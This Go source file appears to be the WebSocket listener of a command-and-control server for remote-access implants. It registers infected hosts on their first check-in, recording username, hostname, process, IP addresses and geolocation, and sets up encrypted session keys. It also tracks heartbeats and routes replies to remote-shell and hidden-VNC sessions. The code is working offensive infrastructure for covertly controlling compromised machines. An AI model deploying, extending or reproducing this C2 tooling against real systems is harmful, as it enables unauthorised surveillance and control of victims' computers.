package websocket

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/notification"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	// 【安全修复】校验 Origin 与请求 Host 同源,防止任意网页跨站连接(CSWSH):
	// 恶意页面可用受害者浏览器凭据发起 WS 连接占用连接/污染会话。
	// 空 Origin(非浏览器客户端)放行,与 HVNC upgrader 同款策略。
	CheckOrigin: func(r *http.Request) bool {
		origin := r.Header.Get("Origin")
		if origin == "" {
			return true
		}
		u, err := url.Parse(origin)
		if err != nil {
			return false
		}
		return u.Host == r.Host
	},
}

var ClientManager = make(map[string]*websocket.Conn)
var MuClientManager sync.Mutex

// BroadcastToXTermSessions / BroadcastToHVNCSessions 由上层(hvnc/xterm)注入
var BroadcastToXTermSessions func(uid string, data []byte)
var BroadcastToHVNCSessions func(uid, sid string, frame []byte)

// WebSocketWriteLocks 每连接独立写互斥(防止并发写帧交错)
var WebSocketWriteLocks = make(map[string]*sync.Mutex)

// GetWriteLock 获取指定 UID 的写锁
func GetWriteLock(uid string) *sync.Mutex {
	MuClientManager.Lock()
	defer MuClientManager.Unlock()
	if WebSocketWriteLocks[uid] == nil {
		WebSocketWriteLocks[uid] = &sync.Mutex{}
	}
	return WebSocketWriteLocks[uid]
}

// ReleaseWriteLock 删除指定 UID 的写锁(断连/清理时调用)
func ReleaseWriteLock(uid string) {
	MuClientManager.Lock()
	defer MuClientManager.Unlock()
	delete(WebSocketWriteLocks, uid)
}

// HandleWebSocket 无显式密钥入口:按监听器地址查密钥后转发
func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
	vkey, salt := encrypt.GetListenerKeyConfigByAddress(r.Host)
	HandleWebSocketWithKeys(w, r, vkey, salt)
}

// HandleWebSocketWithKeys 带监听器密钥入口(与 J4 拒绝默认密钥逻辑配套)
func HandleWebSocketWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logx.Warnf("⚠️ [WS] upgrade failed: %v\n", err)
		return
	}
	handleWSConn(ws, vkey, salt)
}

// HandleWebSocketFor ws_forward 正向客户端入口(连接已建立)
func HandleWebSocketFor(ws *websocket.Conn) {
	vkey, salt := encrypt.GetListenerKeyConfigForForward("websocket")
	HandleWebSocketForWithKeys(ws, vkey, salt)
}

// HandleWebSocketForWithKeys ws_forward 带显式密钥入口
func HandleWebSocketForWithKeys(ws *websocket.Conn, vkey, salt []byte) {
	handleWSConn(ws, vkey, salt)
}

// handleWSConn 连接主循环(普通监听器与正向客户端共用)。
// B3 重构:接入统一离线检测器与连接池(与 TCP/KCP/DNS 一致),删除遗留
// per-client checkHeartbeats(300s 才判死、含死锁路径)与死代码 func main();
// 新增断连 defer 完整清理(原读循环退出后无任何清理,幽灵连接滞留)。
func handleWSConn(ws *websocket.Conn, vkey, salt []byte) {
	// 监听器主密钥(MetaInfo 传输 AES-GCM 解密;显式密钥优先,否则按类型查配置)
	metaMasterKey, _ := encrypt.GetListenerKeyConfig("websocket")
	if len(vkey) > 0 && len(salt) > 0 {
		metaMasterKey, _ = encrypt.NormalizeListenerKeyConfig(vkey, salt)
	}

	// 记录客户端UID,用于连接断开时清理
	var currentUID string
	clientIP := ws.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(clientIP); err == nil {
		clientIP = host
	}
	// 连接池条目 ID(池仅做配额/统计;发送路径仍走 ClientManager——
	// gorilla *websocket.Conn 不实现 net.Conn,故 conn 传 nil,与 DNS 做法一致)
	connectionID := fmt.Sprintf("websocket_%d", time.Now().UnixNano())

	// 延迟清理连接 - 与 TCP/KCP 保持一致的完整清理机制
	defer func() {
		if currentUID != "" {
			logx.Infof("🔌 [WS断开] 客户端连接断开，清理状态: %s\n", currentUID)

			// 【振荡修复】仅当映射仍指向本连接时才删除：客户端重连后
			// ClientManager[uid] 已指向新连接，旧连接 defer 清理误删新连接映射
			MuClientManager.Lock()
			if cur, ok := ClientManager[currentUID]; ok && cur == ws {
				delete(ClientManager, currentUID)
			}
			MuClientManager.Unlock()
			// 清理写锁条目（防止 map 只增不减）
			ReleaseWriteLock(currentUID)
			// 清理全部内存队列并广播离线信号（等待中的 handler 提前返回）
			command.CleanupClientQueues(currentUID)

			// 统一离线检测器注销（仅当仍登记本 UID 时注销，防新连接被旧连接注销）
			if connection.GlobalOfflineDetector != nil && connection.GlobalOfflineDetector.IsRegistered(currentUID) {
				connection.GlobalOfflineDetector.Unregister(currentUID)
			}

			connection.MuClientListenerType.Lock()
			if lt, ok := connection.ClientListenerType[currentUID]; ok && lt == "websocket" {
				delete(connection.ClientListenerType, currentUID)
			}
			connection.MuClientListenerType.Unlock()

			// 统一离线入口：置 Online=2 + 离线事件 + 队列清理（幂等）
			connection.MarkOffline(currentUID, "websocket", "connection_closed")
			logx.Infof("✅ [WS断开] 客户端状态已清理: %s\n", currentUID)
		}
		ws.Close()
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.RemoveConnection(connectionID)
		}
	}()

	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			logx.Infof("🔌 [WS断开] 客户端连接断开: %s (%v)\n", clientIP, err)
			break
		}
		// 外层消息头边界校验：至少 4 字节类型头
		// (原仅校验 len==0,1~3 字节帧在下方 [:4] 切片时 panic)
		if len(message) < 4 {
			logx.Warnf("⚠️ [WS] 消息头长度不足: %d 字节\n", len(message))
			continue
		}
		msgTypeBytes := message[:4]

		msgType := binary.BigEndian.Uint32(msgTypeBytes)
		switch msgType {
		case 1: //firstBlood
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logx.Warnf("⚠️ [WS-FIRSTBLOOD] base64解码失败: %v\n", err)
				continue
			}
			metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
			if err != nil {
				logx.Warnf("⚠️ [WS-FIRSTBLOOD] 元数据解密失败: %v\n", err)
				continue
			}
			// FirstBlood 元数据长度校验
			if len(metainfo) < 10 {
				logx.Warnf("⚠️ [WS-FIRSTBLOOD] 元数据长度不足: %d\n", len(metainfo))
				continue
			}
			uid := encrypt.BytesToMD5(metainfo)
			currentUID = uid

			MuClientManager.Lock()
			ClientManager[uid] = ws
			MuClientManager.Unlock()

			connection.MuClientListenerType.Lock()
			connection.ClientListenerType[uid] = "websocket"
			connection.MuClientListenerType.Unlock()

			// 会话密钥建立（与 TCP/KCP FirstBlood 对齐）：监听器特定密钥派生 + nonce 唯一化下发。
			// 缺失时 sendByProtocol 会回退默认密钥派生 → 与客户端监听器密钥不一致 → GCM 解密失败（命令全挂）。
			if encrypt.GlobalKeyManager != nil {
				listenerKey, listenerSalt := encrypt.GetListenerKeyConfigForForward("websocket")
				if len(vkey) > 0 && len(salt) > 0 {
					listenerKey, listenerSalt = encrypt.NormalizeListenerKeyConfig(vkey, salt)
				}
				if encrypt.IsDefaultListenerKey(listenerKey, listenerSalt) {
					logx.Warnf("⚠️ [WS-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接: %s\n", uid)
					continue
				}
				_, kerr := encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, listenerSalt, listenerKey, listenerSalt)
				if kerr != nil {
					logx.Warnf("⚠️ [WS-FIRSTBLOOD] 生成会话密钥失败: %s, %v\n", uid, kerr)
				} else {
					// type=4|nonce（初始密钥加密，返回即 base64 载荷；WS 帧边界天然成帧，无需长度前缀）
					if b64 := command.BuildSessionNonceMsg(uid, listenerSalt, listenerKey); b64 != nil {
						if werr := ws.WriteMessage(websocket.BinaryMessage, b64); werr != nil {
							logx.Warnf("⚠️ [WS-FIRSTBLOOD] nonce 下发失败: %s, %v\n", uid, werr)
						}
					}
				}
			}

			// 监听器心跳配置(客户端二进制 patch 的同一值;离线检测器阈值用客户端上报 sleep)
			heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(ws.LocalAddr().String(), "websocket")

			var client database.Clients
			exsists, _ := database.DB().Where("uid = ?", uid).Get(&client)
			if !exsists { // FirstBlood
				processID := binary.BigEndian.Uint32(metainfo[:4])
				flag := int(metainfo[4:5][0])
				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()
				osInfo := string(metainfo[9:])

				osArray := strings.Split(osInfo, "\t")
				if len(osArray) < 3 {
					// 原 only 打印不 continue,后续 osArray[1] 取值可 panic
					logx.Warnf("⚠️ [WS-FIRSTBLOOD] bad os info: %d 字段\n", len(osArray))
					continue
				}
				hostName := osArray[0]
				UserName := osArray[1]
				processName := osArray[2]
				clientOs := ""
				if len(osArray) >= 4 {
					clientOs = osArray[3]
				}

				// 外网 ip
				externalIp, _, err := net.SplitHostPort(ws.RemoteAddr().String())
				if err != nil {
					externalIp = ws.RemoteAddr().String()
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}
				address, _ := qqwry.GetLocationByIP(externalIp)

				currentTime := time.Now()
				timeFormat := "2006-01-02 15:04:05"
				formattedTime := currentTime.Format(timeFormat)

				arch := "x86"

				if flag > 8 {
					UserName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: "websocket", Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
				database.DB().Insert(&database.Shell{Uid: uid, ShellContent: ""})
				database.DB().Insert(&database.Notes{Uid: uid, Note: ""})

				// 触发客户端上线通知
				notificationManager := notification.GetNotificationManager()
				if notificationManager != nil {
					notificationManager.OnClientOnline(uid)
				}
				// B11: 发布客户端上线事件(含完整元数据,供前端事件日志展示)
				if command.GlobalEventBus != nil {
					command.PublishEvent(command.EventClientOnline, uid, map[string]interface{}{
						"listener":    "websocket",
						"username":    UserName,
						"computer":    hostName,
						"external_ip": externalIp,
						"internal_ip": localIP,
						"pid":         strconv.Itoa(int(processID)),
						"arch":        arch,
						"os":          clientOs,
						"process":     processName,
					})
				}
			}
			database.SetClientOnline(uid, "websocket")

			// 统一离线检测器注册(替代 per-client checkHeartbeats goroutine:
			// 原实现 10s×30 次=300s 才判死,统一阈值约 4.5×sleep 且全协议一致)
			if connection.GlobalOfflineDetector != nil {
				clientMeta := strings.Split(string(metainfo[9:]), "\t")
				sleepSec := connection.ResolveSleepSeconds(clientMeta, heartbeatInterval)
				connection.GlobalOfflineDetector.Register(uid, "websocket", sleepSec, func() {
					// 离线判定时:仅删仍指向本连接的映射,关连接 → 读循环退出 → defer 完整清理
					MuClientManager.Lock()
					if cur, ok := ClientManager[uid]; ok && cur == ws {
						delete(ClientManager, uid)
					}
					MuClientManager.Unlock()
					ws.Close()
				})
			}

			// 连接池注册(I8 落地:受 MaxConnections 配额限制;conn 传 nil 见函数头注释)
			if connection.GlobalConnectionManager != nil {
				if err := connection.GlobalConnectionManager.AddConnection(connectionID, uid, "websocket", clientIP, nil); err != nil {
					logx.Warnf("⚠️ [WS] 连接池注册失败: %v\n", err)
				}
			}
		case 2: // otherMsg
			msg := message[4:]
			// 【安全】metaLen 为客户端可控值，切片前必须校验，防止恶意 metaLen 触发 panic
			if len(msg) < 4 {
				logx.Warnf("⚠️ [WS] 其他消息头不足\n")
				continue
			}
			metaLen := binary.BigEndian.Uint32(msg[:4])
			if metaLen > uint32(len(msg)-4) {
				logx.Warnf("⚠️ [WS] 其他消息 metaLen 越界\n")
				continue
			}
			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				logx.Warnf("⚠️ [WS] 元数据解码失败: %v\n", err)
				continue
			}
			metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
			if err != nil {
				logx.Warnf("⚠️ [WS] 元数据解密失败: %v\n", err)
				continue
			}
			uid := encrypt.BytesToMD5(metainfo)
			currentUID = uid

			// 任何消息都表示客户端活跃（与 TCP 行为一致）
			if connection.GlobalOfflineDetector != nil {
				connection.GlobalOfflineDetector.Touch(uid)
			}

			dataBytes, _ := encrypt.DecodeBase64(realMsg)
			// 高级会话密钥解密(不回落旧加密)
			dataBytes, err = encrypt.DecryptWithSessionKey(dataBytes, uid)
			if err != nil {
				logx.Warnf("⚠️ [WS] 会话密钥解密失败: %v\n", err)
				continue
			}

			// 拆包 + 边界校验统一走 SplitReplyPayload（B4 收敛）
			replyType, data, err := command.SplitReplyPayload(dataBytes)
			if err != nil {
				logx.Warnf("⚠️ [WS] %v, UID: %s\n", err, uid)
				continue
			}

			// 客户端回包统一处理(TCP/KCP/WS 三协议共用)
			if err := command.HandleClientReply("websocket", uid, replyType, data, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
				logx.Warnf("⚠️ [WS] 处理客户端回包失败 (type=%d): %v\n", replyType, err)
			}
		case 3: //heartBeat
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logx.Warnf("⚠️ [WS] 心跳包解码失败: %v\n", err)
				continue
			}
			metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
			if err != nil {
				logx.Warnf("⚠️ [WS] 心跳包解密失败: %v\n", err)
				continue
			}
			uid := encrypt.BytesToMD5(metainfo)
			currentUID = uid

			// 统一离线检测器 Touch（心跳即活跃;原实现更新 ClientTimeManager 仅供
			// 已删除的 checkHeartbeats 使用,现由检测器 GetLastActive 供在线判定）
			if connection.GlobalOfflineDetector != nil {
				connection.GlobalOfflineDetector.Touch(uid)
			}
		}
	}
}
